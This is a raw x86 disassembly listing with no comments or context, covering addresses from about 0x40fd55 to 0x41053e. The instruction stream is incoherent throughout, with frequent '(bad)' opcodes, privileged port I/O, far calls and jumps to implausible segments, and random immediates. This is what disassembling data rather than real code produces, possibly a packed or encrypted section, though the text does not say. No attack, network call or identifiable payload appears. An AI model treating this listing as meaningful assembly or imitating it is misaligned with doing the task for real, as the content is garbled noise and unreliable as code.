  40fd55:	and    esp,esi
  40fd57:	test   BYTE PTR [eax],ch
  40fd59:	add    BYTE PTR [ebx+0x2186221d],cl
  40fd5f:	cdq    
  40fd60:	mov    ?,WORD PTR [ebx-0x25]
  40fd63:	add    al,0x79
  40fd65:	nop
  40fd66:	adc    ah,bh
  40fd68:	dec    edi
  40fd69:	sbb    DWORD PTR [ebx-0x14],0x915a7a77
  40fd70:	or     edx,DWORD PTR [edi+0x3cd531d]
  40fd76:	add    edx,DWORD PTR [esp+eax*4-0x1ab49f2e]
  40fd7d:	xchg   ebp,eax
  40fd7e:	sbb    al,0x9f
  40fd80:	daa    
  40fd81:	mov    bh,0xd7
  40fd83:	pop    eax
  40fd84:	ficom  DWORD PTR [ebx+0x1d]
  40fd87:	call   0xac4b:0xaf618f31
  40fd8e:	push   es
  40fd8f:	jo     0xe4c1d80e
  40fd95:	and    eax,edx
  40fd97:	add    BYTE PTR [ebx+0x1654ffce],dl
  40fd9d:	cmp    edi,DWORD PTR [edi]
  40fd9f:	and    al,0x7
  40fda1:	(bad)  
  40fda3:	fwait
  40fda4:	in     eax,dx
  40fda5:	xchg   edx,eax
  40fda6:	or     al,0xf6
  40fda8:	das    
  40fda9:	jbe    0x40fe08
  40fdab:	xor    DWORD PTR [ecx],eax
  40fdad:	loope  0x40fdc9
  40fdaf:	out    dx,eax
  40fdb0:	inc    eax
  40fdb1:	dec    edx
  40fdb2:	or     BYTE PTR [edi-0x30a697df],ah
  40fdb8:	inc    edi
  40fdb9:	inc    edi
  40fdba:	jbe    0x40fe2d
  40fdbc:	cmp    al,0xc4
  40fdbe:	and    dl,ch
  40fdc0:	pop    ebx
  40fdc1:	gs jl  0x40fe18
  40fdc4:	fnsave [ebp+0x11]
  40fdc7:	popf   
  40fdc8:	and    eax,0x76957bd1
  40fdcd:	test   ebx,0x9325cf61
  40fdd3:	add    al,0x96
  40fdd5:	pop    ecx
  40fdd6:	stos   DWORD PTR es:[edi],eax
  40fdd7:	in     al,dx
  40fdd8:	int    0x5e
  40fdda:	sbb    al,0xc0
  40fddc:	nop
  40fddd:	mov    cl,0xdc
  40fddf:	sbb    dh,BYTE PTR [eax+0x5f78993e]
  40fde5:	shr    DWORD PTR [edx],cl
  40fde7:	inc    eax
  40fde8:	ja     0x40fdab
  40fdea:	jp     0x40fdf6
  40fdec:	mov    ds:0x6288269a,eax
  40fdf1:	prefetch (bad)
  40fdf2:	or     eax,0xbb43e8f0
  40fdf7:	in     eax,0x25
  40fdf9:	add    DWORD PTR [ebx-0x19e077a9],ecx
  40fdff:	add    eax,0x367974a5
  40fe04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe05:	jb     0x40fdc9
  40fe07:	adc    BYTE PTR [eax+0x43],bh
  40fe0a:	test   BYTE PTR ds:0xe4aa99f9,0xa0
  40fe11:	ins    BYTE PTR es:[edi],dx
  40fe12:	adc    edx,0x4d
  40fe15:	jmp    0x15a3:0x924d6da
  40fe1c:	dec    esi
  40fe1d:	cmp    al,0x2a
  40fe1f:	sub    esi,DWORD PTR [ebp-0x65986cfe]
  40fe25:	push   esp
  40fe26:	push   ds
  40fe27:	imul   esi,DWORD PTR [ebx],0x21
  40fe2a:	(bad)  
  40fe2c:	fs mul esi
  40fe2f:	out    dx,al
  40fe30:	push   ebp
  40fe31:	pop    esi
  40fe32:	mov    al,ds:0x2c886003
  40fe37:	sbb    DWORD PTR [edx+eax*2-0x2],0x9e70d6bd
  40fe3f:	(bad)  
  40fe40:	stos   BYTE PTR es:[edi],al
  40fe41:	fs loop 0x40fde6
  40fe44:	icebp  
  40fe45:	outs   dx,BYTE PTR ds:[esi]
  40fe46:	jge    0x40fe48
  40fe48:	int3   
  40fe49:	outs   dx,DWORD PTR ds:[esi]
  40fe4a:	xrelease mov BYTE PTR [eax+0x15806e3e],ah
  40fe51:	sbb    ax,0x8c9b
  40fe55:	pop    ebx
  40fe56:	lds    ebp,FWORD PTR [edi]
  40fe58:	test   al,0xb6
  40fe5a:	or     eax,0x6c0c8657
  40fe5f:	imul   ecx,DWORD PTR [ebx-0x6],0x2d
  40fe63:	or     BYTE PTR [edi+0x7e],ch
  40fe66:	and    BYTE PTR [ebp+0x60],ah
  40fe69:	fld    DWORD PTR [edi-0x5ee0af45]
  40fe6f:	lds    esp,FWORD PTR [ebx+0x46d6c85f]
  40fe75:	push   edx
  40fe76:	inc    ebp
  40fe77:	xor    al,0xf0
  40fe79:	loop   0x40fecf
  40fe7b:	jp     0x40fea4
  40fe7d:	cmp    DWORD PTR ds:0x60efbf74,esp
  40fe83:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe85:	mov    ds:0x181b3598,eax
  40fe8a:	xor    BYTE PTR [ecx-0x2f],bl
  40fe8d:	pop    edi
  40fe8e:	rol    BYTE PTR [ecx-0x29e8e8df],1
  40fe94:	sbb    al,0x24
  40fe96:	in     al,0xd0
  40fe98:	in     al,dx
  40fe99:	mov    dl,0xa3
  40fe9b:	push   ebx
  40fe9c:	adc    eax,0xcb2ab77
  40fea1:	nop
  40fea2:	pop    ds
  40fea3:	mov    al,ds:0xb04f0db7
  40fea8:	dec    edi
  40fea9:	ins    BYTE PTR es:[edi],dx
  40feaa:	scas   eax,DWORD PTR es:[edi]
  40feab:	jecxz  0x40fe43
  40fead:	push   edi
  40feae:	push   ds
  40feaf:	inc    ebx
  40feb0:	pop    edi
  40feb1:	sbb    ch,0x70
  40feb4:	in     al,dx
  40feb5:	sbb    cl,BYTE PTR [edx]
  40feb7:	mov    WORD PTR [eax],cs
  40feb9:	loopne 0x40fea4
  40febb:	fwait
  40febc:	mov    al,ds:0x557fefd1
  40fec1:	retf   
  40fec2:	pop    ebp
  40fec3:	push   ebx
  40fec4:	dec    esp
  40fec5:	pop    ebx
  40fec6:	and    BYTE PTR [ecx+0x38],ah
  40fec9:	sub    esp,DWORD PTR [esi+0x50]
  40fecc:	fild   WORD PTR [eax+0x2d]
  40fecf:	and    dh,dl
  40fed1:	inc    ecx
  40fed2:	sub    esi,DWORD PTR [edx-0x17753993]
  40fed8:	jg     0xdb52
  40fedd:	aad    0xa6
  40fedf:	mov    ds:0x2e34ccb6,al
  40fee4:	in     al,dx
  40fee5:	je     0x40fead
  40fee7:	add    DWORD PTR [ecx+edx*1+0x72],eax
  40feeb:	push   ebp
  40feec:	cmp    BYTE PTR [esi-0xbf2aa87],0x79
  40fef3:	mov    al,ds:0x595df2a8
  40fef8:	adc    edx,DWORD PTR [edx]
  40fefa:	sar    DWORD PTR [edi-0x6f],0x75
  40fefe:	(bad)  [edx]
  40ff00:	dec    ebp
  40ff01:	test   eax,0x598c8acb
  40ff06:	(bad)  
  40ff07:	push   esi
  40ff08:	and    al,0xd
  40ff0a:	cwde   
  40ff0b:	mov    ah,0x8d
  40ff0d:	das    
  40ff0e:	or     DWORD PTR [edx],ebp
  40ff10:	test   BYTE PTR [ebx],al
  40ff12:	loop   0x40fea6
  40ff14:	div    DWORD PTR [edi+0x55fa0cbd]
  40ff1a:	retf   
  40ff1b:	mov    eax,ds:0x69dccdf8
  40ff20:	adc    eax,0x83c051bb
  40ff25:	sti    
  40ff26:	push   esi
  40ff27:	inc    ecx
  40ff28:	mov    WORD PTR [edx-0x6115e024],?
  40ff2e:	aas    
  40ff2f:	popf   
  40ff30:	xchg   ebx,eax
  40ff31:	add    cl,BYTE PTR [ebx-0x4e]
  40ff34:	adc    al,0x47
  40ff36:	dec    eax
  40ff37:	daa    
  40ff38:	push   edx
  40ff39:	jp     0x40fede
  40ff3b:	int    0x20
  40ff3d:	mov    ebx,0x39b573d8
  40ff42:	mov    dh,0x15
  40ff44:	fdivrp st(3),st
  40ff46:	xchg   edx,eax
  40ff47:	dec    eax
  40ff48:	or     ebx,DWORD PTR [ecx+edi*8]
  40ff4b:	xlat   BYTE PTR ds:[ebx]
  40ff4c:	xchg   esi,eax
  40ff4d:	sub    ecx,DWORD PTR [ebx+0x71a01503]
  40ff53:	add    bh,BYTE PTR [edx+0x7f]
  40ff56:	into   
  40ff57:	xchg   ebp,eax
  40ff58:	mov    ds:0xb1ab9047,al
  40ff5d:	mov    ebp,0x25549c85
  40ff62:	xor    eax,0xc9cd1bc3
  40ff67:	xor    DWORD PTR [ebx],0x6ed32640
  40ff6d:	or     al,0x89
  40ff6f:	nop
  40ff70:	inc    esi
  40ff71:	xor    eax,0x8d4df466
  40ff76:	cs jmp 0xdeb2d971
  40ff7c:	ins    BYTE PTR es:[edi],dx
  40ff7d:	pop    es
  40ff7e:	and    ch,BYTE PTR [ecx]
  40ff80:	fstp   QWORD PTR [ebp+0x1e]
  40ff83:	or     al,0x2e
  40ff85:	mov    edx,0xc3742403
  40ff8a:	mov    dl,0xc2
  40ff8c:	inc    eax
  40ff8d:	repz cmc 
  40ff8f:	imul   eax,DWORD PTR [ecx-0x5c],0xe69fb549
  40ff96:	inc    ebp
  40ff97:	sub    BYTE PTR [ebp+edi*4-0x6b277130],bl
  40ff9e:	fst    DWORD PTR [edx+0x56]
  40ffa1:	bound  ecx,QWORD PTR [esi-0x1281c15a]
  40ffa7:	in     al,0x98
  40ffa9:	jmp    0x40ffa7
  40ffab:	stos   BYTE PTR es:[edi],al
  40ffac:	mov    bl,0xc3
  40ffae:	inc    esp
  40ffaf:	sbb    dh,al
  40ffb1:	add    eax,0xb8f30a81
  40ffb6:	mov    ch,bl
  40ffb8:	jns    0x40ffa2
  40ffba:	out    0x99,eax
  40ffbc:	ins    BYTE PTR es:[edi],dx
  40ffbd:	sti    
  40ffbe:	sahf   
  40ffbf:	mov    esi,0x7ee01ae3
  40ffc4:	loope  0x40ffed
  40ffc6:	pop    edi
  40ffc7:	mov    ecx,0x1ec99efe
  40ffcc:	out    dx,eax
  40ffcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffce:	dec    esp
  40ffcf:	cld    
  40ffd0:	inc    esp
  40ffd1:	stos   DWORD PTR es:[edi],eax
  40ffd2:	mov    bl,0x27
  40ffd4:	pop    edi
  40ffd5:	and    eax,0x88344e40
  40ffda:	or     al,0x33
  40ffdc:	jmp    0x40ffd3
  40ffde:	dec    ecx
  40ffdf:	loopne 0x40ffc0
  40ffe1:	es out dx,al
  40ffe3:	js     0x40ffa1
  40ffe5:	adc    DWORD PTR [eax+ebx*1+0x32],esi
  40ffe9:	and    ecx,DWORD PTR [edi]
  40ffeb:	in     eax,0xdf
  40ffed:	or     ch,bl
  40ffef:	test   DWORD PTR [edi],0xef8a28e5
  40fff5:	rcl    DWORD PTR [ebp-0x422f4af3],0xea
  40fffc:	(bad)  
  40fffd:	rcl    BYTE PTR [eax-0x39],1
  410000:	sbb    al,0x61
  410002:	jge    0x410043
  410004:	test   BYTE PTR [edx-0xc],0x89
  410008:	sbb    al,0xab
  41000a:	(bad)
  41000d:	sub    esi,DWORD PTR [ebp-0x6e]
  410010:	cmp    al,0x4e
  410012:	inc    ecx
  410013:	xchg   esi,ebp
  410015:	aam    0x8b
  410017:	sbb    al,0xfc
  410019:	inc    esp
  41001a:	jb     0x410011
  41001c:	xchg   esi,eax
  41001d:	dec    esi
  41001e:	fistp  QWORD PTR [esi+0x45]
  410021:	pop    ecx
  410022:	jbe    0x40ffbd
  410024:	add    eax,0xd1abd429
  410029:	cli    
  41002a:	xchg   esp,eax
  41002b:	hlt    
  41002c:	push   esp
  41002d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002e:	enter  0xad5b,0x75
  410032:	xchg   ebx,eax
  410033:	mov    ch,0x4
  410035:	pushf  
  410036:	popa   
  410037:	cwde   
  410038:	xor    BYTE PTR [ebx+0x1],al
  41003b:	std    
  41003c:	mov    edx,0xc81fb0af
  410041:	data16 sub al,0x20
  410044:	or     eax,0xbdaa5a05
  410049:	mov    al,0x17
  41004b:	adc    esp,edi
  41004d:	pop    edx
  41004e:	in     eax,dx
  41004f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410050:	add    eax,0x455d8411
  410055:	mov    dh,BYTE PTR fs:0xedd37200
  41005c:	leave  
  41005d:	inc    ecx
  41005e:	and    ah,BYTE PTR ss:[eax+0x6d]
  410062:	push   ds
  410063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410064:	loopne 0x4100c9
  410066:	adc    eax,0xbeb04b59
  41006b:	adc    DWORD PTR [edx-0x2305cefa],esp
  410071:	push   0xb4acd8bc
  410076:	sub    DWORD PTR [edx-0x6a2cea99],eax
  41007c:	loope  0x41007f
  41007e:	sub    eax,0x313d938a
  410083:	dec    ebx
  410084:	mov    esi,0x1b5eabc
  410089:	or     eax,0x6914166b
  41008e:	repz mov bl,0x77
  410091:	fist   DWORD PTR ds:0x593303be
  410097:	cli    
  410098:	jle    0x4100b9
  41009a:	add    eax,0xdc1fdd65
  41009f:	or     al,0x0
  4100a1:	add    DWORD PTR [ebp+0x34],eax
  4100a4:	cdq    
  4100a5:	loop   0x41004e
  4100a7:	arpl   WORD PTR [edx],sp
  4100a9:	sbb    DWORD PTR [edx+eax*2+0xf8c4561],ebp
  4100b0:	daa    
  4100b1:	sub    al,0x8a
  4100b3:	and    eax,0x6344c907
  4100b8:	and    eax,0xc6f516eb
  4100bd:	sub    al,0x3c
  4100bf:	sub    edx,DWORD PTR [eax-0x8]
  4100c2:	and    al,cl
  4100c4:	sub    BYTE PTR [esi+ebx*1+0x2964720f],dh
  4100cb:	pop    ebx
  4100cc:	push   esi
  4100cd:	je     0x4100d7
  4100cf:	xchg   ebx,eax
  4100d0:	and    ebx,ecx
  4100d2:	aad    0x70
  4100d4:	push   ebp
  4100d5:	push   ss
  4100d6:	push   es
  4100d7:	push   ds
  4100d8:	mov    WORD PTR [esi-0x2b],gs
  4100db:	xor    ecx,DWORD PTR [eax]
  4100dd:	xchg   ebx,eax
  4100de:	inc    edx
  4100df:	mov    dh,dh
  4100e1:	in     eax,0x1a
  4100e3:	sub    ah,cl
  4100e5:	push   ss
  4100e6:	or     cl,BYTE PTR [ebp-0x37]
  4100e9:	lahf   
  4100ea:	push   eax
  4100eb:	ret    0xfe3f
  4100ee:	scas   al,BYTE PTR es:[edi]
  4100ef:	sbb    eax,0x1af89c5e
  4100f4:	imul   esi,DWORD PTR [ebx+0x4e],0x515a971c
  4100fb:	loope  0x410102
  4100fd:	out    dx,al
  4100fe:	sbb    al,0xf2
  410100:	push   ebp
  410101:	jge    0x410119
  410103:	add    BYTE PTR ds:0x572ae1e5,0xf2
  41010a:	xchg   ebp,eax
  41010b:	outs   dx,DWORD PTR ds:[esi]
  41010c:	in     eax,dx
  41010d:	mov    edx,0x665ee2c3
  410112:	pushf  
  410113:	imul   edi,ecx,0xa169049b
  410119:	int    0xd4
  41011b:	cmc    
  41011c:	hlt    
  41011d:	jbe    0x4100b5
  41011f:	test   DWORD PTR [edx-0x4f],edi
  410122:	mov    ds:0xa4852936,al
  410127:	lea    edi,[edx]
  410129:	scas   al,BYTE PTR es:[edi]
  41012a:	mov    edx,esi
  41012c:	and    DWORD PTR [ebp+eiz*2+0x28eeb2a9],ebx
  410133:	and    al,0xe9
  410135:	or     ecx,esp
  410137:	icebp  
  410138:	cmc    
  410139:	xchg   eax,eax
  41013b:	jno    0x410166
  41013d:	test   cl,dh
  41013f:	add    al,BYTE PTR [ebx-0x2802e4cc]
  410145:	adc    ah,BYTE PTR [eax]
  410147:	pop    eax
  410148:	mov    edx,0x82bbea07
  41014d:	es repnz stos BYTE PTR es:[edi],al
  410150:	mov    cl,0x10
  410152:	push   esp
  410153:	dec    edi
  410154:	xchg   edi,eax
  410155:	call   0xc2a:0x410683e1
  41015c:	xchg   esp,esp
  41015e:	push   ebx
  41015f:	or     al,0x38
  410161:	stos   BYTE PTR es:[edi],al
  410162:	xor    ebp,DWORD PTR [edi+0x53b331f1]
  410168:	mov    ch,0xf9
  41016a:	jmp    ebx
  41016c:	outs   dx,BYTE PTR ds:[esi]
  41016d:	cli    
  41016e:	gs inc edx
  410170:	xchg   DWORD PTR [ecx+0x5522049],edi
  410176:	(bad)  
  410177:	clc    
  410178:	loopne 0x4101c7
  41017a:	xchg   ebx,eax
  41017c:	call   0x66bd:0xff10733c
  410183:	into   
  410184:	dec    eax
  410185:	test   DWORD PTR [esi-0x3237f69f],edx
  41018b:	jle    0x4101cf
  41018d:	stos   DWORD PTR es:[edi],eax
  41018e:	in     al,dx
  41018f:	(bad)  
  410190:	jns    0x410117
  410192:	ret    0x73aa
  410195:	jnp    0x4101b1
  410197:	xor    cl,bh
  410199:	jp     0x41020b
  41019b:	dec    ebp
  41019c:	in     eax,dx
  41019d:	cmc    
  41019e:	pushf  
  41019f:	fisub  WORD PTR [ecx+0x3c]
  4101a2:	retf   0x5c61
  4101a5:	pop    ebp
  4101a6:	and    BYTE PTR [ebx+ebp*4],bl
  4101a9:	sti    
  4101aa:	dec    eax
  4101ab:	mov    ds:0xe50f0de1,eax
  4101b0:	mov    ah,0xa1
  4101b2:	dec    esp
  4101b3:	mov    ebp,gs
  4101b5:	pop    ss
  4101b6:	or     edi,DWORD PTR [ebp-0x6f621484]
  4101bc:	or     eax,DWORD PTR [eax+edx*1+0x6d5c5f93]
  4101c3:	xor    DWORD PTR [ebp-0x39cf559c],esi
  4101c9:	adc    eax,0xc0e0a51f
  4101ce:	shr    BYTE PTR [edi-0x64aaa002],cl
  4101d4:	test   BYTE PTR [esi+ebp*4+0xe],bl
  4101d8:	(bad)  
  4101d9:	lds    edi,FWORD PTR [eax+0x3]
  4101dc:	fimul  WORD PTR [eax+0x402c2411]
  4101e2:	mov    DWORD PTR [esi+0x30],ebx
  4101e5:	cwde   
  4101e6:	pusha  
  4101e7:	and    al,0x68
  4101e9:	inc    edx
  4101ea:	aaa    
  4101eb:	fdiv   st(7),st
  4101ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ee:	add    al,cl
  4101f0:	test   al,0xc2
  4101f2:	sbb    al,0x61
  4101f4:	push   es
  4101f5:	bound  ebx,QWORD PTR ss:[edi+edi*8]
  4101f9:	mov    esi,0x5a654f17
  4101fe:	fidivr WORD PTR [edi+0x360b1866]
  410204:	(bad)  
  410205:	loopne 0x410227
  410207:	jmp    0xe7e8:0xd119cfd8
  41020e:	mov    edx,0xf65ec5d6
  410213:	test   eax,0x4ee51ea8
  410218:	jmp    0x410293
  41021a:	mov    BYTE PTR [ebp+0x391ab452],ah
  410220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410221:	mov    ebx,0xcac0ceb5
  410226:	mov    al,ds:0x30b33c3a
  41022b:	push   0xffffff81
  41022d:	sar    BYTE PTR [esi+ebp*8-0x4d821f59],0xc7
  410235:	or     al,0xe5
  410237:	cdq    
  410238:	cmp    DWORD PTR [ecx+0x3d632a8e],edi
  41023e:	mov    edi,0x67af1741
  410243:	pop    esi
  410244:	mov    dh,0x7a
  410246:	(bad)  
  410248:	sub    ebx,esp
  41024a:	daa    
  41024b:	(bad)  
  41024c:	gs pop edi
  41024e:	les    ebx,FWORD PTR [edi-0x7e]
  410251:	enter  0xc81a,0x73
  410255:	and    eax,0x43c15129
  41025a:	ins    BYTE PTR es:[edi],dx
  41025b:	adc    al,0xe4
  41025d:	in     eax,dx
  41025e:	mov    al,ds:0x548fa8ef
  410263:	inc    ebp
  410264:	int    0x9f
  410266:	mov    ds:0x108d0dde,al
  41026b:	lods   eax,DWORD PTR ds:[esi]
  41026c:	push   ecx
  41026d:	aam    0xa1
  41026f:	aas    
  410270:	das    
  410271:	scas   al,BYTE PTR es:[edi]
  410272:	mov    bh,0xd3
  410274:	mov    eax,ds:0x9e5f4414
  410279:	xor    ch,dh
  41027b:	jmp    0xce848e37
  410280:	fadd   st,st(3)
  410282:	jg     0x410207
  410284:	push   ss
  410285:	adc    edi,ebp
  410287:	pop    ecx
  410288:	pusha  
  410289:	cdq    
  41028a:	mov    ch,0x6a
  41028c:	mov    ecx,0x54d47256
  410291:	push   esp
  410292:	cmc    
  410293:	pop    edx
  410294:	sbb    al,0xa9
  410296:	cmp    ch,BYTE PTR [ecx+0x66ee7444]
  41029c:	sub    DWORD PTR [eax-0x57],eax
  41029f:	xlat   BYTE PTR ds:[ebx]
  4102a0:	mov    ebx,0x5e1d14d0
  4102a5:	mov    dh,0x88
  4102a7:	xchg   BYTE PTR [eax-0x73bd182f],ch
  4102ad:	call   DWORD PTR [edx+0x5e]
  4102b0:	fdivp  st(6),st
  4102b2:	outs   dx,BYTE PTR ds:[esi]
  4102b3:	rol    DWORD PTR [ebx],1
  4102b5:	push   esp
  4102b6:	aaa    
  4102b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b8:	mov    eax,ds:0x3d5511bc
  4102bd:	and    cl,bl
  4102bf:	sti    
  4102c0:	dec    ebx
  4102c1:	pop    es
  4102c2:	jno    0x4102d3
  4102c4:	pop    es
  4102c5:	inc    ecx
  4102c6:	cmp    cl,al
  4102c8:	and    BYTE PTR [esi],al
  4102ca:	sub    eax,0x17e07dfa
  4102cf:	push   cs
  4102d0:	sahf   
  4102d1:	pop    edx
  4102d2:	sbb    edi,DWORD PTR [ecx-0x3907b2ab]
  4102d8:	jmp    0xf1ac03d2
  4102dd:	mov    bl,0x38
  4102df:	(bad)  
  4102e0:	into   
  4102e1:	popf   
  4102e2:	(bad)  
  4102e3:	popa   
  4102e4:	lock js 0x4102a9
  4102e7:	int3   
  4102e8:	ins    BYTE PTR es:[edi],dx
  4102e9:	push   es
  4102ea:	aad    0x94
  4102ec:	xlat   BYTE PTR ds:[ebx]
  4102ed:	mov    ch,0x25
  4102ef:	cdq    
  4102f0:	nop
  4102f1:	pop    edx
  4102f2:	lea    esp,[esi+0x6c]
  4102f5:	int3   
  4102f6:	sub    bh,BYTE PTR [edi]
  4102f8:	xchg   DWORD PTR [eax+0x76],eax
  4102fb:	mul    BYTE PTR es:[edi+0x5f3e43fe]
  410302:	xor    eax,0x8e399a61
  410307:	or     ebp,esp
  410309:	push   edx
  41030a:	imul   ebp,eax,0xffffffaa
  41030d:	cmp    dh,0xb1
  410310:	fs shl eax,cl
  410313:	sub    BYTE PTR [edx],dh
  410315:	icebp  
  410316:	dec    ebp
  410317:	test   DWORD PTR [eax+0x4d7a25bd],ebx
  41031d:	ret    
  41031e:	in     eax,0xe2
  410320:	pop    edx
  410321:	cmp    eax,0xf9e7b9e2
  410326:	sbb    edi,ebp
  410328:	repz adc edx,esi
  41032b:	addr16 jp 0x410344
  41032e:	xchg   edx,eax
  41032f:	popa   
  410330:	jecxz  0x410356
  410332:	in     eax,0x0
  410334:	iret   
  410335:	nop
  410336:	push   edx
  410337:	mov    DWORD PTR [eax+eax*4+0x4],ebx
  41033b:	add    al,0xc2
  41033d:	test   BYTE PTR [ecx*4+0x226f8a],al
  410344:	es jmp 0x4102cb
  410347:	pop    edx
  410348:	push   cs
  410349:	dec    ebx
  41034a:	scas   al,BYTE PTR es:[edi]
  41034b:	jmp    0x4103a3
  41034d:	jae    0x4102d7
  41034f:	inc    esp
  410350:	push   edx
  410351:	inc    ebp
  410352:	xlat   BYTE PTR cs:[ebx]
  410354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410355:	adc    al,0x77
  410357:	mov    eax,ds:0xf64485e2
  41035c:	add    al,0xfc
  41035e:	mov    BYTE PTR [ebx-0x19574313],bl
  410364:	das    
  410365:	dec    ebx
  410366:	fist   WORD PTR [ebx-0x73efd587]
  41036c:	add    eax,0x572d30ca
  410371:	sbb    ebx,ecx
  410373:	scas   al,BYTE PTR es:[edi]
  410374:	sub    al,0x28
  410376:	cld    
  410377:	(bad)  
  410378:	retf   
  410379:	jb     0x41033f
  41037b:	into   
  41037c:	(bad)
  41037f:	cli    
  410380:	xchg   esp,eax
  410381:	sub    dh,BYTE PTR [esi]
  410383:	cmp    DWORD PTR [ebp+eax*4-0x21],esp
  410387:	mov    ebx,DWORD PTR [ebx]
  410389:	test   ebp,edx
  41038b:	test   eax,0xc3620245
  410390:	jno    0x4103f0
  410392:	jbe    0x4103ac
  410394:	pop    ds
  410395:	shl    BYTE PTR [edx-0x4adb822d],1
  41039b:	or     ah,BYTE PTR [esi]
  41039d:	test   DWORD PTR [esi+0x31958580],edi
  4103a3:	xor    eax,0x7fdfa44
  4103a8:	je     0x410401
  4103aa:	fs iret 
  4103ac:	imul   ebx,DWORD PTR [edx+0x2d2de96d],0x24
  4103b3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4103b5:	or     DWORD PTR [ecx+eiz*1-0x1293098e],0x5e
  4103bd:	mov    edx,0x4ff89871
  4103c2:	iret   
  4103c3:	push   ss
  4103c4:	mov    bl,0xff
  4103c6:	xchg   ebx,edx
  4103c8:	outs   dx,BYTE PTR ds:[esi]
  4103c9:	mov    bh,0xb6
  4103cb:	add    al,0x8a
  4103cd:	int3   
  4103ce:	jns    0x41040f
  4103d0:	add    al,0xf
  4103d2:	jl     0x410375
  4103d4:	and    BYTE PTR [ebp-0x32],bl
  4103d7:	(bad)  
  4103d8:	jle    0x4103cf
  4103da:	ror    BYTE PTR [ebp+0xe],0x59
  4103de:	pop    ds
  4103df:	mov    ebp,0x6f9ffa96
  4103e4:	xchg   edi,eax
  4103e5:	ja     0x4103e2
  4103e7:	(bad)  
  4103e8:	xchg   edx,eax
  4103e9:	sub    ch,ch
  4103eb:	gs pop ecx
  4103ed:	in     al,0x2c
  4103ef:	sub    edi,DWORD PTR [ebx+edi*4+0x7b96fb7d]
  4103f6:	or     esp,0x0
  4103f9:	sub    ebp,DWORD PTR [ebx+0xd19d2d4]
  4103ff:	out    dx,eax
  410400:	and    BYTE PTR [esi],0x50
  410403:	mov    WORD PTR [esi+0x6cf05195],fs
  410409:	cmp    ebp,DWORD PTR [ecx-0x740ec8e8]
  41040f:	push   edx
  410410:	inc    edi
  410411:	mov    edx,0x2b68a556
  410416:	(bad)  [edx+0x4e60452f]
  41041c:	int    0x93
  41041e:	(bad)  
  41041f:	jg     0x4103c4
  410421:	and    edi,DWORD PTR [ebx]
  410423:	xor    eax,0xef7f560a
  410428:	dec    ebp
  410429:	lahf   
  41042a:	or     eax,ecx
  41042c:	lea    ebp,[edx+0x3eb81cb9]
  410432:	or     DWORD PTR [ebp+eiz*2+0x24f1fdc0],0xffffffe6
  41043a:	dec    esi
  41043b:	mov    bh,0x14
  41043d:	cdq    
  41043e:	inc    edi
  41043f:	or     ebp,ebp
  410441:	push   0xe0b3c7f2
  410446:	out    0xbd,eax
  410448:	(bad)  
  410449:	jb     0x410462
  41044b:	rcr    DWORD PTR [edi+esi*1-0x67665936],cl
  410452:	add    eax,0xfa3b9213
  410457:	or     eax,0xd052d978
  41045c:	mov    ebx,0x8d5d469
  410461:	or     dl,BYTE PTR [ebp-0x65]
  410464:	or     eax,0x54b27b06
  410469:	sti    
  41046a:	or     bh,BYTE PTR [ebx-0x6b]
  41046d:	xchg   BYTE PTR ds:0x5dde750b,ch
  410473:	into   
  410474:	cmp    al,BYTE PTR cs:[ebx]
  410477:	jno    0x4104f0
  410479:	scas   al,BYTE PTR es:[edi]
  41047a:	mov    dl,0x9d
  41047c:	add    BYTE PTR [edi+eiz*4-0x1a],bh
  410480:	pop    edx
  410481:	inc    edx
  410482:	inc    ebx
  410483:	mov    al,0xaf
  410485:	inc    ebp
  410486:	pop    ss
  410487:	pusha  
  410488:	arpl   WORD PTR [edx-0x50c07a49],cx
  41048e:	sbb    esi,DWORD PTR [esi-0x7]
  410491:	ja     0x4104fa
  410493:	pop    ebp
  410494:	mov    edx,0xed554f3c
  410499:	mov    eax,ds:0x78b8fedf
  41049e:	jae    0x4104e0
  4104a0:	add    al,0x7a
  4104a2:	rol    BYTE PTR [edx+ebp*8],0xae
  4104a6:	push   ds
  4104a7:	repz pop eax
  4104a9:	das    
  4104aa:	fisttp QWORD PTR [ebp-0x51ecc65b]
  4104b0:	repz fwait
  4104b2:	sti    
  4104b3:	pop    ebp
  4104b4:	dec    esp
  4104b5:	out    0x3d,al
  4104b7:	push   es
  4104b8:	stc    
  4104b9:	jmp    0x410445
  4104bb:	push   esp
  4104bc:	fs out 0xb9,al
  4104bf:	sub    DWORD PTR [eax+ecx*2],ebx
  4104c2:	aas    
  4104c3:	test   eax,0xcb95c8a0
  4104c8:	sbb    BYTE PTR gs:[ebx+esi*8],cl
  4104cc:	push   esi
  4104cd:	mov    ds:0x809d3df,al
  4104d2:	xchg   ecx,eax
  4104d3:	mov    al,0xc6
  4104d5:	mov    DWORD PTR [esi+0x46],edi
  4104d8:	sti    
  4104d9:	mov    bl,0xbe
  4104db:	jmp    0x4aa9:0xaf5b3d3e
  4104e2:	loopne 0x4104b2
  4104e4:	cdq    
  4104e5:	and    BYTE PTR [ebx],0x71
  4104e8:	pushf  
  4104e9:	dec    edi
  4104ea:	sbb    ah,bh
  4104ec:	push   cs
  4104ed:	xor    eax,0x86e4e14f
  4104f2:	dec    esp
  4104f3:	retf   0x1faa
  4104f6:	pop    ebx
  4104f7:	lahf   
  4104f8:	and    ah,BYTE PTR [esi+0x85023f2]
  4104fe:	jmp    0x781c:0x1816b700
  410505:	jmp    0x7adff53f
  41050a:	addr16 icebp 
  41050c:	or     BYTE PTR [esi-0x51],ah
  41050f:	push   0xb5eab1f9
  410514:	mov    al,ds:0x967ceb52
  410519:	pop    ebp
  41051a:	call   0xcc52ca41
  41051f:	jbe    0x4104c0
  410521:	repnz call 0xc35e:0x8271990e
  410529:	cs jns 0x410588
  41052c:	call   0xf691e5e9
  410531:	sub    eax,0xf1c1bafb
  410536:	rol    DWORD PTR [eax-0x63bab99a],1
  41053c:	ss dec ebx
  41053e:	sar    BYTE PTR [eax-0x5b],1
